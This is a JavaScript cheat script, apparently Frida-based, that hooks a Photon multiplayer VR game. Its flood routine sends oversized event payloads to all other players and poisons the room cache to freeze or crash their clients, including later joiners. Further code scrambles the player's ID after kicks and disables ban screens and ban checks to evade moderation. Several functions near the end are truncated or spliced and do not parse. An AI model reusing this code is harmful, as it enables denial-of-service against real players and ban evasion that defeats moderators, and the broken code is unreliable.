    function _freezeFindCls(asms, name) {
        for (const a of asms) {
            try { const c = Il2Cpp.domain.assembly(a).image.class(name); if (c) return c; } catch (_) { }
        }
        return null;
    }
    function _freezeSetByteEnum(obj, name, v) {
        try { const vt = obj.field(name).value; vt.field("value__").value = v; return true; }
        catch (_) { return false; }
    }

    // Actor numbers of everyone we may hit: all players except our own client.
    // Rebuilt only when the roster actually changes.
    function _freezeRefreshTargets() {
        let self = 0;
        try {
            const lp = localPlayer();
            if (lp && !lp.isNull?.()) self = lp.method("get_ActorNumber").invoke();
        } catch (_) { }
        const nums = [];
        for (const p of allPlayers()) {
            try {
                const nr = p.method("get_ActorNumber").invoke();
                if (typeof nr === "number" && nr > 0 && nr !== self) nums.push(nr);
            } catch (_) { }
        }
        const key = nums.join(",");
        let changed = false;
        if (key !== _freezeTargetsKey) {
            _freezeTargetsKey = key;
            _freezeTargets = nums.length ? Il2Cpp.array(Il2Cpp.corlib.class("System.Int32"), nums) : null;
            changed = true;
        }
        return { n: nums.length, arr: _freezeTargets, changed: changed };
    }
    function _freezeGetCache() {
        if (_freezeCache) return _freezeCache;
        const reoCls = _freezeFindCls(["PhotonRealtime", "Photon3Unity3D"], "Photon.Realtime.RaiseEventOptions");
        if (!reoCls) throw new Error("RaiseEventOptions class not found");
        // WebFlags lives in Photon.Realtime in THIS build (dump.cs: "// Namespace:
        // Photon.Realtime", script.json: Photon_Realtime_WebFlags_o). Older PUN
        // builds put it in ExitGames.Client.Photon - try both.
        const wfCls = _freezeFindCls(["PhotonRealtime", "Photon3Unity3D", "PhotonUnityNetworking"], "Photon.Realtime.WebFlags")
            || _freezeFindCls(["Photon3Unity3D", "PhotonRealtime", "PhotonUnityNetworking"], "ExitGames.Client.Photon.WebFlags");
        if (!wfCls) throw new Error("WebFlags class not found");
        // Flags = new WebFlags(byte.MaxValue): every webhook/sync/state bit on.
        const wf = wfCls.alloc();
        try { wf.method(".ctor", 1).invoke(255); } catch (e) { throw new Error("WebFlags ctor: " + e); }
        const mkOpts = () => {
            const reo = reoCls.alloc();
            try { reo.method(".ctor", 0).invoke(); } catch (_) { }
            try { reo.field("Flags").value = wf; } catch (e) { throw new Error("Flags: " + e); }
            return reo;
        };
        // TargetActors is written per burst (see _freezeRefreshTargets): both
        // option objects always mean "every actor except us".
        const reoTarget = mkOpts();
        // Vector E: same targeting, but cached for every future joiner.
        const reoCache = mkOpts();
        if (!_freezeSetByteEnum(reoCache, "CachingOption", 5)) throw new Error("CachingOption write failed");
        // SendOptions.SendUnreliable (static readonly struct; run the cctor so
        // the static is definitely initialized, then read the value).
        const soCls = _freezeFindCls(["Photon3Unity3D", "PhotonRealtime", "PhotonUnityNetworking"], "ExitGames.Client.Photon.SendOptions");
        if (!soCls) throw new Error("SendOptions class not found");
        try { soCls.method(".cctor", 0).invoke(); } catch (_) { }
        let so = null;
        try { so = soCls.field("SendUnreliable").value; } catch (e) { throw new Error("SendUnreliable: " + e); }
        if (!so) throw new Error("SendUnreliable read null");
        // Payload 1 (A/B/D): new object[]{ ~30 KB string } — same shape as the
        // C#'s object[]{ serverLink }, sized near Photon's ~32 KB ceiling.
        const strPayload = Il2Cpp.array(Il2Cpp.corlib.class("System.Object"),
            [Il2Cpp.string("BS-FREEZE:".padEnd(30000, "A"))]);
        // Payload 2 (C/E): raw 31.5 KB byte[] — Wireless-style blob.
        const bytesPayload = Il2Cpp.array(Il2Cpp.corlib.class("System.Byte"), new Array(31500).fill(0x41));
        if (!strPayload || !bytesPayload) throw new Error("payload alloc failed");
        _freezeCache = { reoTarget, reoCache, so, strPayload, bytesPayload };
        return _freezeCache;
    }
    // One FreezeServer()-style batch from OUR client: room/eviction guards,
    // fresh victim targeting, then all five vectors. Returns sent count,
    // 0 = waiting/throttled, -1 = can't send, -2 = no other players to hit.
    function _freezeServerBurst() {
        const pun = PUN();
        if (!pun) { _freezeHaltReason = "PhotonNetwork class not resolved yet"; return -1; }
        let inRoom = false, connected = true, inRoomErr = null;
        try { inRoom = !!pun.method("get_InRoom").invoke(); } catch (e) { inRoomErr = e; }
        try { connected = !!pun.method("get_IsConnected").invoke(); } catch (_) { }
        if (!inRoom) {
            // Out of the room: if that happened while flooding and our own
            // connection is gone, WE were kicked — pause; rejoining a room
            // (user's choice) resumes the flood on a fresh connection.
            if (_freezeSelfWasInRoom && !connected && !_freezeStopped) {
                _freezeStopped = true;
                console.log("[freeze] self disconnected - paused (resumes next time you're in a room)");
                sendNotification("crash all testy: you were disconnected - paused", false);
            }
            _freezeSelfWasInRoom = false;
            _freezeHaltReason = (inRoomErr != null ? "get_InRoom threw: " + inRoomErr
                : "not in a room (connected=" + connected + ")") +
                (_freezeStopped ? " - paused after disconnect, resumes on rejoin" : "");
            return -1;
        }
        _freezeSelfWasInRoom = true;
        if (_freezeStopped) {
            _freezeStopped = false;
            console.log("[freeze] back in a room - resuming after disconnect pause");
            sendNotification("crash all testy: resumed", false);
        }
        if (time < _freezeNext) return 0;
        let c;
        try { c = _freezeGetCache(); }
        catch (e) { _freezeHaltReason = "cache build: " + e; ARC.warnOnce("freeze", "cache build: " + e); return -1; }
        _freezeNext = time + _freezeDelay;
        const tg = _freezeRefreshTargets();
        if (tg.changed) {
            try {
                c.reoTarget.field("TargetActors").value = tg.arr;
                c.reoCache.field("TargetActors").value = tg.arr;
            } catch (e) { _freezeHaltReason = "TargetActors write: " + e; ARC.warnOnce("freeze", "TargetActors: " + e); return -1; }
        }
        if (!tg.n) {
            if (time >= _freezeNoVictimAt) {
                console.log("[freeze] no other players to hit yet");
                _freezeNoVictimAt = time + 5;
            }
            return -2;
        }
        _freezeBursts++;
        let sent = 0, alive = true;
        const raise = (code, payload, opts) => {
            try {
                const ok = pun.method("RaiseEvent", 4).invoke(code, payload, opts, c.so);
                if (ok === false) return false;
                sent++;
                return true;
            } catch (e) { ARC.warnOnce("freeze", "RaiseEvent: " + e); return false; }
        };
        const loop = (n, code, payload, opts) => {
            for (let i = 0; i < n; i++) {
                if (!raise(code, payload, opts)) { alive = false; return; }
            }
        };
        // A + B: the 40 event-54s of FreezeServer(0.5f, 40), victim-targeted.
        loop(_freezeRecipeCount, _freezeEventCode, c.strPayload, c.reoTarget);
        if (alive) loop(_freezeRecipeCount, _freezeEventCode, c.strPayload, c.reoTarget);
        // C: Wireless inbound-queue saturator.
        if (alive) loop(_freezeWirelessCount, 1, c.bytesPayload, c.reoTarget);
        // D: sweep this game's real event range 150-164.
        if (alive) {
            for (let i = 0; i < _freezeBsCount; i++) {
                const code = _freezeBsLo + (_freezeBsIdx % (_freezeBsHi - _freezeBsLo + 1));
                _freezeBsIdx++;
                if (!raise(code, c.strPayload, c.reoTarget)) { alive = false; break; }
            }
        }
        // E: every 3rd burst poisons the room cache for future joiners.
        if (alive && (_freezeBursts % 3) === 0) {
            loop(_freezeCacheCount, 1, c.bytesPayload, c.reoCache);
        }
        // Flush immediately so the whole batch leaves this frame.
        try { sendAllOutgoing(); } catch (_) { }
        if (!alive && time >= _freezeLogAt) {
            console.log("[freeze] raise failed mid-burst (rate-limited or being kicked)");
            _freezeLogAt = time + 2;
        }
        return sent;
    }
    function _freezeReset() {
        _freezeStopped = false;
        _freezeNext = 0;
        _freezeLogAt = 0;
        _freezeBursts = 0;
        _freezeBsIdx = 0;
        _freezeNoVictimAt = 0;
        _freezeTargetsKey = "";
        _freezeTargets = null;
        _freezeSelfWasInRoom = false;
        _freezeHaltReason = "not started";
        _freezeHaltShown = null;
        try { const p = PUN(); if (p) _freezeSelfWasInRoom = !!p.method("get_InRoom").invoke(); } catch (_) { }
    }
    // Rotate OUR UserId (== playFabId) for a fresh 16-hex id on kick, so the
    // ban lookup keyed on the old id stops matching us on REJOIN. Skipped if
    // the "shiddy anti ban" toggle already owns the id. Must run BEFORE
    // LeaveRoom: the custom-props rewrite needs live room context.
    function _freezeScrambleId() {
        try {
            if (_banNewId) return; // anti-ban toggle already scrambled it
            const oldId = _banReadId();
            let newId = "";
            for (let i = 0; i < 16; i++) newId += "0123456789ABCDEF"[(Math.random() * 16) | 0];
            const surfaces = _banWriteId(newId);
            const props = oldId ? _banRewriteProps(oldId, newId) : 0;
            console.log("[WOT] id scrambled post-kick old=" + (oldId || "none") + " new=" + newId + " surfaces=" + surfaces + " props=" + props);
        } catch (e) { console.log("[WOT] id scramble failed: " + e); }
    }
    let _freezeReconnectPending = false;
    let _freezeReconnectTries = 0;
    function _freezeStopFloodUI(reason) {
        try {
            const bmGet = (k) => buttonMap && buttonMap.get && buttonMap.get(k);
            const fa = bmGet("Freeze All");
            if (fa) fa.enabled = false;
            const cat = bmGet("crash all testy");
            if (cat) cat.enabled = false;
            try { if (typeof reloadMenu === "function") reloadMenu(); } catch (_) {}
        } catch (_) {}
        console.log("[WOT] flood stopped (" + reason + ")");
        sendNotification("flood: kicked -> reconnecting (" + reason + ")", false);
    }
    // After a flood kick the server has already killed the transport — a soft
    // LeaveRoom cannot keep it alive, and skipping Photon's teardown entirely
    // leaves LoadBalancingClient half-dead (every join/auth then hangs at
    // "loading..." until a game restart). So the hook runs the REAL teardown,
    // and this brings the connection back on a timer with the scrambled id.
    // Bounded to 3 attempts per cycle so a server that keeps rejecting us
    // never hot-loops; after 3 failures it cools down 15s and retries rather
    // than giving up (so a kick can never permanently strand the client).
    function _freezeScheduleReconnect(causeVal) {
        if (_freezeReconnectPending) return;
        _freezeReconnectPending = true;
        setTimeout(() => {
            _freezeReconnectPending = false;
            try {
                const pun = PUN();
                if (!pun) return;
                const connected = !!pun.method("get_IsConnected").invoke();
                if (connected) {
                    let inRoom = false;
                    try { inRoom = !!pun.method("get_InRoom").invoke(); } catch (_) { }
                    if (_freezeReconnectTries !== 0) {
                        console.log("[WOT] reconnect: already connected (inRoom=" + inRoom + ") — try budget reset");
                        _freezeReconnectTries = 0;
                    }
                    return;
                }
                if (_freezeReconnectTries >= 3) {
                    console.log("[WOT] reconnect: 3 tries spent — cooling down 15s, then retrying (never strands)");
                    _freezeReconnectTries = 0;
                    _freezeReconnectPending = true;
                    setTimeout(() => { _freezeReconnectPending = false; _freezeScheduleReconnect(causeVal); }, 15000);
                    return;
                }
                _freezeReconnectTries++;
                let ok = false;
                try { ok = !!pun.method("Reconnect").invoke(); } catch (e) { console.log("[WOT] Reconnect threw: " + e); }
                if (!ok) {
                    try { ok = !!pun.method("ConnectUsingSettings", 1).invoke(NULL); } catch (e) { console.log("[WOT] ConnectUsingSettings(1) threw: " + e); }
                }
                if (!ok) {
                    try { ok = !!pun.method("ConnectUsingSettings", 0).invoke(); } catch (e) { console.log("[WOT] ConnectUsingSettings(0) threw: " + e); }
                }
                console.log("[WOT] reconnect try " + _freezeReconnectTries + " -> " + ok + " (post-kick cause=" + causeVal + ")");
                if (ok) {
                    setTimeout(() => {
                        try {
                            const p2 = PUN();
                            if (p2 && !!p2.method("get_IsConnected").invoke() && _freezeReconnectTries !== 0) {
                                console.log("[WOT] reconnect verified healthy — try budget reset");
                                _freezeReconnectTries = 0;
                            }
                        } catch (_) { }
                    }, 3000);
                }
            } catch (e) { console.log("[WOT] reconnect failed: " + e); }
        }, 500);
    }
    function _installFreezeDisconnectHook() {
        if (_freezeDisconnectHook) return;
        _freezeDisconnectHook = true;
        // 1) LoadBalancingClient.Disconnect(DisconnectCause) — every kick, any
        //    cause (4/6 socket drop, 9/10 server logic, 17 via game paths,
        //    19 explicit disconnect message). While a flood toggle is on:
        //    scramble the id FIRST (props rewrite needs room context), then
        //    run the REAL teardown so Photon's state machine stays consistent,
        //    stop the flood, and auto-reconnect with the fresh identity.
        try {
            const lbcCls = Il2Cpp.domain.assembly("PhotonRealtime").image.class("Photon.Realtime.LoadBalancingClient");
            const disc1 = lbcCls.method("Disconnect", 1);
            try { disc1.revert(); } catch (_) { }
            disc1.implementation = function (cause) {
                let causeVal = NaN;
                try { causeVal = Number(cause.field("value__").value); } catch (_) { }
                if (_freezeProtectionActive && causeVal !== 20) {
                    console.log("[WOT] LBC.Disconnect/1 cause=" + causeVal + " -> teardown + auto-reconnect (flood on)");
                    _freezeScrambleId();
                    const ret = disc1.invokeRaw(this, cause);
                    _freezeStopFloodUI("kick cause=" + causeVal);
                    _freezeScheduleReconnect(causeVal);
                    return ret;
                }
                console.log("[WOT] LBC.Disconnect/1 cause=" + causeVal + " freeze=" + _freezeProtectionActive + " -> passthrough");
                return disc1.invokeRaw(this, cause);
            };
            console.log("[WOT] hooked LBC.Disconnect/1");
        } catch (e) { console.log("[WOT] LBC.Disconnect/1 hook failed: " + e); }
        // 2) Disconnect() 0-arg — logs the call; its inner Disconnect(17) is
        //    handled by the /1 filter above.
        try {
            const lbcCls = Il2Cpp.domain.assembly("PhotonRealtime").image.class("Photon.Realtime.LoadBalancingClient");
            const disc0 = lbcCls.method("Disconnect", 0);
            try { disc0.revert(); } catch (_) { }
            disc0.implementation = function () {
                console.log("[WOT] LBC.Disconnect/0 freeze=" + _freezeProtectionActive + " -> passthrough");
                return disc0.invokeRaw(this);
            };
            console.log("[WOT] hooked LBC.Disconnect/0");
        } catch (e) { console.log("[WOT] LBC.Disconnect/0 hook failed: " + e); }
        // 3) Client-side ban/force-quit enforcers — skipped while a flood
        //    toggle is on. These are what actually make a kick "perma" client-
        //    side (ban screen, self-kick poll, app force-close).
        const blockWhileFlood = (cls, name, argc, label) => {
            try {
                const m = argc == null ? cls.method(name) : cls.method(name, argc);
                try { m.revert(); } catch (_) { }
                m.implementation = function () {
                    if (_freezeProtectionActive) {
                        console.log("[WOT] BLOCKED " + label);
                        return;
                    }
                    return m.isStatic ? m.invokeRaw(NULL, ...arguments) : m.invokeRaw(this, ...arguments);
                };
                console.log("[WOT] hooked " + label);
            } catch (e) { console.log("[WOT] " + label + " hook failed: " + e); }
        };
        try { blockWhileFlood(AssemblyCSharp.class("BanErrorDisplay"), "Show", null, "BanErrorDisplay.Show"); } catch (e) { console.log("[WOT] BanErrorDisplay: " + e); }
        try { blockWhileFlood(AssemblyCSharp.class("Photon.VR.Player.PhotonVRPlayer"), "CheckBanned", null, "PhotonVRPlayer.CheckBanned"); } catch (e) { console.log("[WOT] CheckBanned: " + e); }
        try { blockWhileFlood(AssemblyCSharp.class("PlayfabManager"), "OnApplicationQuit", null, "PlayfabManager.OnApplicationQuit"); } catch (e) { console.log("[WOT] PlayfabManager: " + e); }
        try {
            blockWhileFlood(UnityEngineCore.class("UnityEngine.Application"), "Quit", 0, "Application.Quit");
            blockWhileFlood(UnityEngineCore.class("UnityEngine.Application"), "Quit", 1, "Application.Quit(int)");
        } catch (e) { console.log("[WOT] Application.Quit: " + e); }
        // 4) The game's OWN networking wrapper (PhotonVRManager) — these run
        //    the client-side perma state machine and can fire WITHOUT going
        //    through LoadBalancingClient: its Disconnect() tears the session
        //    down directly, OnDisconnected() is what the game reacts to with
        //    its disconnect/perma UI, and HandleJoinError()/OnJoinRoomFailed()
        //    poison every rejoin attempt afterwards. All swallowed while a
        //    flood toggle is on. Same for PlayfabManager.AddBanMessage, which
        //    feeds the ban payload into the UI even if Show-block catches the
        //    screen itself.
        // OnDisconnected gets a CUSTOM handler: swallowing the game's reaction
        // (perma/disconnect UI) AND guaranteeing the reconnect is scheduled —
        // transport deaths that reach this callback without a prior
        // LBC.Disconnect/1 would otherwise strand the client with no recovery.
        try {
            const mOD = AssemblyCSharp.class("Photon.VR.PhotonVRManager").method("OnDisconnected", 1);
            try { mOD.revert(); } catch (_) { }
            mOD.implementation = function (cause) {
                if (!_freezeProtectionActive) return mOD.invokeRaw(this, ...arguments);
                let cv = NaN;
                try { cv = Number(cause.field("value__").value); } catch (_) { }
                console.log("[WOT] PhotonVRManager.OnDisconnected cause=" + cv + " swallowed -> ensure reconnect");
                _freezeScheduleReconnect(cv);
                return;
            };
            console.log("[WOT] hooked PhotonVRManager.OnDisconnected");
        } catch (e) { console.log("[WOT] PhotonVRManager.OnDisconnected hook failed: " + e); }
        try { blockWhileFlood(AssemblyCSharp.class("Photon.VR.PhotonVRManager"), "Disconnect", 0, "PhotonVRManager.Disconnect"); } catch (e) { console.log("[WOT] PhotonVRManager: " + e); }
        try { blockWhileFlood(AssemblyCSharp.class("Photon.VR.PhotonVRManager"), "HandleJoinError", 0, "PhotonVRManager.HandleJoinError"); } catch (e) { console.log("[WOT] PhotonVRManager: " + e); }
        try { blockWhileFlood(AssemblyCSharp.class("Photon.VR.PhotonVRManager"), "OnJoinRoomFailed", 2, "PhotonVRManager.OnJoinRoomFailed"); } catch (e) { console.log("[WOT] PhotonVRManager: " + e); }
        try { blockWhileFlood(AssemblyCSharp.class("PlayfabManager"), "AddBanMessage", 1, "PlayfabManager.AddBanMessage"); } catch (e) { console.log("[WOT] PlayfabManager: " + e); }
    }
    // Auto-arm at load. Filter is gated on _freezeProtectionActive at call
    // time, so the protection cannot fail to install just because a toggle
    // forgot to call _installFreezeDisconnectHook.
    _installFreezeDisconnectHook();
    // --- "shiddy anti ban test thing" — Photon UserId (== playFabId) rotation -
    // Binary-verified plumbing this leans on:
    //  • LoadBalancingClient.get_UserId (0x5B65AAC) = AuthValues?.UserId:
    //    LDR [this+0x30] -> LDR [AuthValues+0x30] (the <UserId> backing field).
    //  • set_UserId (0x5B65AC4): when AuthValues is null it objectNew's a fresh
    //    one with authType 0xFF (CustomAuthenticationType.None), then writes
    //    <UserId>. So ONE client.set_UserId() call covers the client property,
    //    AuthValues, and the id OpAuthenticate ships on the NEXT connect.
    //  • Mid-session writes touch no server call at all -> zero rejection risk.
    //  • Player.UserId is a plain auto-prop (set_UserId 0x5B771A0, field @0x28).
    // Limits: what other clients already see was fixed when we joined (shared
    // only if room.PublishUserId), so a moderator banning the OLD id can still
    // kick the CURRENT session — a server-side op we cannot block from here.
    // The scramble makes ban-menu lookup on the old id stop matching us on
    // REJOIN, and covers every surface we can reach locally: AuthValues, the
    // local Player, our custom props, and the game's own "PunUserId"
    // PlayerPrefs entry if it keeps one (read-then-restore on disable).
    let _banOrigId = null;
    let _banNewId = null;
    let _banPpOrig = null;
    let _banPpTouched = false;
    let _banPropsFixed = 0;

    function _banStr(v) {
        try {
            if (v == null || v.isNull?.()) return null;
            const s = v.content ?? null;
            return typeof s === "string" ? s : null;
        } catch (_) { return null; }
    }
    function _banReadId() {
        try {
            const pun = PUN();
            if (pun) {
                const c = pun.field("NetworkingClient").value;
                if (c && !c.isNull?.()) { const s = _banStr(c.method("get_UserId").invoke()); if (s) return s; }
            }
        } catch (_) { }
        try {
            const lp = localPlayer();
            if (lp && !lp.isNull?.()) { const s = _banStr(lp.method("get_UserId").invoke()); if (s) return s; }
        } catch (_) { }
        return null;
    }
    function _banWriteId(id) {
        const arg = id != null ? Il2Cpp.string(id) : null;
        let n = 0;
        try {
            const pun = PUN();
            const c = pun ? pun.field("NetworkingClient").value : null;
            if (c && !c.isNull?.()) { c.method("set_UserId", 1).invoke(arg); n++; }
        } catch (e) { ARC.warnOnce("ban", "client set_UserId: " + e); }
        try {
            const lp = localPlayer();
            if (lp && !lp.isNull?.()) { lp.method("set_UserId", 1).invoke(arg); n++; }
        } catch (e) { ARC.warnOnce("ban", "player set_UserId: " + e); }
        return n;
    }
    // Keys of OUR custom properties whose STRING value === probe (an id).
    function _banScanOwnProps(probe) {
        const hits = [];
        if (!probe) return hits;
        try {
            const lp = localPlayer();
            if (!lp || lp.isNull?.()) return hits;
            const cp = lp.method("get_CustomProperties").invoke();
            if (!cp || cp.isNull?.()) return hits;
            let count = null, entries = null;
            try { count = cp.field("count").value; } catch (_) { }
            if (count === null) { try { count = cp.field("_count").value; } catch (_) { } }
            try { entries = cp.field("entries").value; } catch (_) { try { entries = cp.field("_entries").value; } catch (_) { } }
            const cn = count?.valueOf ? count.valueOf() : count;
            if (!entries || entries.isNull?.() || !cn) return hits;
            for (let i = 0; i < cn && i < 64; i++) {
                let e = null;
                try { e = entries.get(i); } catch (_) { continue; }
                if (!e) continue;
                let kk = null, vv = null;
                try { kk = e.field("key").value; } catch (_) { }
                try { vv = e.field("value").value; } catch (_) { }
                const k = _banStr(kk);
                if (k && _banStr(vv) === probe) hits.push(k);
            }
        } catch (_) { }
        return hits;
    }
    // Rewrite every prop that held `probe` to `newId` via the actor-targeted
    // op (server-applied, so other clients' caches update too).
    function _banRewriteProps(probe, newId) {
        const keys = _banScanOwnProps(probe);
        if (!keys.length || !newId) return 0;
        let actorNr = 0;
        try { actorNr = localPlayer().method("get_ActorNumber").invoke(); } catch (_) { }
        let n = 0;
        for (const k of keys) {
            try {
                const ht = _newPhotonHashtable(k, newId);
                if (!ht) continue;
                if (_opSetCustomPropertiesOfActor(actorNr, ht) || _setPlayerCustomProperties(localPlayer(), ht)) n++;
            } catch (e) { ARC.warnOnce("ban", "prop " + k + ": " + e); }
        }
        if (n) { try { sendAllOutgoing(); } catch (_) { } }
        return n;
    }
    function _banPpGet(key) {
        try {
            const ps = _freezeFindCls(["UnityEngine.CoreModule"], "UnityEngine.PlayerPrefs");
            if (!ps) return null;
            if (!ps.method("HasKey", 1).invoke(Il2Cpp.string(key))) return null;
            return _banStr(ps.method("GetString", 1).invoke(Il2Cpp.string(key)));
        } catch (_) { return null; }
    }
    function _banPpSet(key, val) {
        try {
            const ps = _freezeFindCls(["UnityEngine.CoreModule"], "UnityEngine.PlayerPrefs");
            if (!ps) return false;
            ps.method("SetString", 2).invoke(Il2Cpp.string(key), Il2Cpp.string(val));
            ps.method("Save").invoke();
            return true;
        } catch (e) { ARC.warnOnce("ban", "prefs: " + e); return false; }
    }
    // One console line answering "where does my identity actually live?".
    function _banDiag(oldId) {
        try {
            const pun = PUN();
            let publish = "no-room";
            try {
                const room = pun.method("get_CurrentRoom").invoke();
                if (room && !room.isNull?.()) publish = room.method("get_PublishUserId").invoke() ? "1" : "0";
            } catch (_) { publish = "?"; }
            let auth = "none";
            try {
                const c = pun.field("NetworkingClient").value;
                const a = c.method("get_AuthValues").invoke();
                if (a && !a.isNull?.()) auth = "type=" + _enumVal(a.method("get_AuthType").invoke());
            } catch (_) { auth = "?"; }
            let have = 0, total = 0, meNr = 0;
            try { const lp = localPlayer(); if (lp && !lp.isNull?.()) meNr = lp.method("get_ActorNumber").invoke(); } catch (_) { }
            for (const p of allPlayers()) {
                try {
                    if (p.method("get_ActorNumber").invoke() === meNr) continue;
                    total++;
                    if (_banStr(p.method("get_UserId").invoke())) have++;
                } catch (_) { }
            }
            const propKeys = _banScanOwnProps(oldId);
            console.log("[antiban] publishUserId=" + publish + " auth(" + auth + ") remotesWithId=" + have + "/" + total +
                " propsHoldOld=" + (propKeys.length ? propKeys.join(",") : "none") +
                " prefsPunUserId=" + (_banPpGet("PunUserId") != null ? "yes" : "no"));
            return propKeys.length;
        } catch (e) { console.log("[antiban] diag failed: " + e); return 0; }
    }
    function _rigSSPrune() {
        // Drop rigs that Photon or scene cleanup already destroyed.
        _rigSSSpawnedRigs = _rigSSSpawnedRigs.filter(r => {
            try { return r && !r.isNull?.() && unityAlive(r); }
            catch (_) { return false; }
        });
        return _rigSSSpawnedRigs.length;
    }
    function _rigSSSpawnOne(headTf, i) {
        try {
            const position = headTf.method("get_position").invoke();
            const up = Vector3.method("get_up").invoke();
            const right = Vector3.method("get_right").invoke();
            const add = Vector3.method("op_Addition", 2);
            const multiply = Vector3.method("op_Multiply", 2);
            const origin = add.invoke(
                add.invoke(position, multiply.invoke(up, 1000)),
                multiply.invoke(right, 1000)
            );
            const spawnPosition = add.invoke(origin, multiply.invoke(right, i * 2));
            const rotation = Il2Cpp.domain.assembly("UnityEngine.CoreModule")
                .image.class("UnityEngine.Quaternion").method("get_identity").invoke();
            const prefab = Il2Cpp.string("photonvr/OnlinePlayerRig");
            const data = Il2Cpp.array(Il2Cpp.corlib.class("System.Object"), []);
            const photon = Il2Cpp.domain.assembly("PhotonUnityNetworking").image.class("Photon.Pun.PhotonNetwork");
            const rig = photon.method("Instantiate", 5).invoke(prefab, spawnPosition, rotation, 0, data);
            if (!rig || rig.isNull?.()) return null;
            return rig;
        } catch (e) { console.warn("[rigSS] spawn err: " + e); return null; }
    }
    function _rigSSFillTo(target) {
        try {
            const photon = Il2Cpp.domain.assembly("PhotonUnityNetworking").image.class("Photon.Pun.PhotonNetwork");
            if (!photon.method("get_InRoom").invoke()) return 0;
            const headTf = getTransform(headCollider);
            if (!headTf || headTf.isNull()) return 0;
            _rigSSPrune();
            let added = 0;
            for (let i = _rigSSSpawnedRigs.length; i < target; i++) {
                const r = _rigSSSpawnOne(headTf, i);
                if (!r) continue;
                _rigSSSpawnedRigs.push(r);
                added++;
            }

    function _rigSSDestroyAll() {

            }
        } catch (_) { }

        if (n) console.log("[rigSS] destroyed " + n + " rigs");

    // Each spawned rig has its own PhotonCosmeticUpdaterComponent. Write the
    // slot->id entry into that updater's DGBCODLKEOP dict, same as the local
    // path does for your own player.
    function _rigSSUpdaters() {
        const out = [];

            const updCls = _classOrNull("PhotonCosmeticUpdaterComponent");
            if (!updCls) return out;
            for (const rig of _rigSSSpawnedRigs) {
                try {
                    if (!rig || rig.isNull?.() || !unityAlive(rig)) continue;

                    if (!unityAlive(u)) { try { u = rig.method("GetComponentInChildren", 1).inflate(updCls).invoke(); } catch (_) { } }
                    if (unityAlive(u)) out.push(u);
                } catch (_) { }
            }
        } catch (_) { }
        return out;
    }
    function _rigSSApplyCosmeticSlot(slotName, id) {
        const slot = BIDBHMCCOCH_SLOTS[slotName];

                    n++;
                }
            } catch (_) { }
        }

        return n;
    }
    function _setInternalCosmetic(slotName, id) {

                done = true;

        return done;
    }

    function _publishCosmetics(map) {
        try {
            if (_rigRedirectActive) {
                // When rig-SS is on, each rig's PhotonCosmeticUpdaterComponent
                // publishes its own slot map. Writing to the local player's
                // "Cosmetics" prop would re-apply the mod hat to our own avatar.
                console.log("[cos] publish skipped (rig-SS redirect active)");
                return true;
            }
            const me = localPlayer();
            if (!me) { console.warn("[cos] no local player"); return false; }
            let htCls = null;
            for (const asm of ["Photon3Unity3D", "PhotonRealtime", "PhotonUnityNetworking", "Assembly-CSharp"]) {
                try {
                    const k = Il2Cpp.domain.assembly(asm).image.class("ExitGames.Client.Photon.Hashtable");
                    if (k) { htCls = k; break; }
                } catch (_) { }
            }
            if (!htCls) { console.warn("[cos] Photon Hashtable class not found"); return false; }
            const table = htCls.alloc();
            try { table.method(".ctor", 0).invoke(); } catch (_) { }
            const json = JSON.stringify(map);
            try { table.method("set_Item", 2).overload("System.Object", "System.Object").invoke(Il2Cpp.string("Cosmetics"), Il2Cpp.string(json)); }
            catch (_) {
                try { table.method("Add", 2).overload("System.Object", "System.Object").invoke(Il2Cpp.string("Cosmetics"), Il2Cpp.string(json)); }
                catch (e) { console.warn("[cos] could not fill Hashtable: " + e); return false; }
            }
            // SetCustomProperties(props, expected, webFlags) -- arity varies.
            let ok = false, last = null;
            for (const n of [3, 2, 1]) {
                try {
                    if (n === 3) me.method("SetCustomProperties", 3).invoke(table, NULL, NULL);
                    else if (n === 2) me.method("SetCustomProperties", 2).invoke(table, NULL);
                    else me.method("SetCustomProperties", 1).invoke(table);
                    ok = true; break;
                } catch (e) { last = e; }
            }
            console.log("[cos] publish " + json + " -> " + (ok ? "OK" : "FAILED: " + last));
            return ok;
        } catch (e) { console.warn("[cos] publish failed: " + e); return false; }
    }
    function _classOrNull(name) {
        try {
            const c = AssemblyCSharp.class(name);
            console.log("[cos] class " + name + " -> " + (c ? "ok" : "null"));
            return c;
        } catch (e) { console.warn("[cos] class " + name + " NOT FOUND: " + e); return null; }
    }
    // Same lookup without the console noise, memoized per name — for the
    // per-frame toggles that would otherwise spam the log every frame.
    // NOTE: `Object` is rebound in this file to UnityEngine.Object (il2cpp
    // class wrapper), so JS `Object.create(null)` throws. Use a plain {} map.
    const _classMemo = {};
    function _classQuiet(name) {
        if (name in _classMemo) return _classMemo[name];
        let c = null;
        try { c = AssemblyCSharp.class(name); } catch (_) { c = null; }
        _classMemo[name] = c;
        return c;
    }

    // Build a Photon Hashtable with a single string key -> string value.
    let _photonHashtableClass = null;
    function _photonHashtableCls() {
        if (_photonHashtableClass) return _photonHashtableClass;
        for (const asm of ["Photon3Unity3D", "PhotonRealtime", "PhotonUnityNetworking", "Assembly-CSharp"]) {
            try {
                const k = Il2Cpp.domain.assembly(asm).image.class("ExitGames.Client.Photon.Hashtable");
                if (k) { _photonHashtableClass = k; return k; }
            } catch (_) { }
        }
        return null;
    }
    function _newPhotonHashtable(key, value) {
        const cls = _photonHashtableCls();
        if (!cls) return null;
        const t = cls.alloc();
        try { t.method(".ctor", 0).invoke(); } catch (_) { }
        try { t.method("set_Item", 2).overload("System.Object", "System.Object").invoke(Il2Cpp.string(key), Il2Cpp.string(value)); }
        catch (_) {
            try { t.method("Add", 2).overload("System.Object", "System.Object").invoke(Il2Cpp.string(key), Il2Cpp.string(value)); } catch (_) { return null; }
        }
        return t;
    }
    // Call SetCustomProperties(ht) on a Player; tries all overloads. The method
    // returns false when its guards fail (e.g. null RoomReference + !IsLocal on
    // a remote player), so honour the returned bool instead of assuming success.
    function _setPlayerCustomProperties(player, ht) {
        for (const n of [3, 2, 1]) {
            try {
                let r = null;
                if (n === 3) r = player.method("SetCustomProperties", 3).invoke(ht, NULL, NULL);
                else if (n === 2) r = player.method("SetCustomProperties", 2).invoke(ht, NULL);
                else r = player.method("SetCustomProperties", 1).invoke(ht);
                if (r === false) return false;
                return true;
            } catch (_) { }
        }
        return false;
    }
    // LoadBalancingClient.OpSetCustomPropertiesOfActor(actorNr, hashtable, ...)
    // ships raw OpSetProperties targeting any actorNr. Disassembly of this build
    // shows the client NEVER compares actorNr to our own actor (no ownership /
    // IsLocal guard on this path), so the server applies it to that player's
    // props directly — and it bypasses Player.SetCustomProperties' offline
